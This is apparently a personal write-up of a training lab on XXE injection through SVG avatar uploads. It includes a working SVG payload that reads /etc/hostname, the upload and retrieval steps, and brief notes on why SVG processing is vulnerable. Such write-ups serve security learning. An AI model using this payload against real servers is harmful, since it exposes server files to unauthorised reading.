# Lab: Exploiting XXE via Image File Upload

## How to Solve
1. **Create a malicious SVG file (`exploit.svg`):**
   ```xml
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
   <svg width="500px" height="500px" xmlns="http://w3.org" xmlns:xlink="http://w3.org" version="1.1">
      <text font-size="40" x="0" y="100">&xxe;</text>
   </svg>
   ```
2. **Upload as Avatar:** Go to any blog post, fill in the comment form, and upload `exploit.svg` as your avatar.
3. **Read the Output:** Post the comment, right-click your profile picture, and select **Open image in new tab** to read the rendered `/etc/hostname` text.
4. **Submit:** Copy the hostname and click **Submit solution** to complete the lab.

## What I Learned
* **SVG is XML:** Unlike PNG or JPG, SVG images are written in XML, making them vulnerable to XXE if the backend image processor (like Apache Batik) doesn't disable external entities.
* **Visual Data Exfiltration:** When the server converts the malicious SVG into a standard image, sensitive server files get rendered directly onto the image as text.
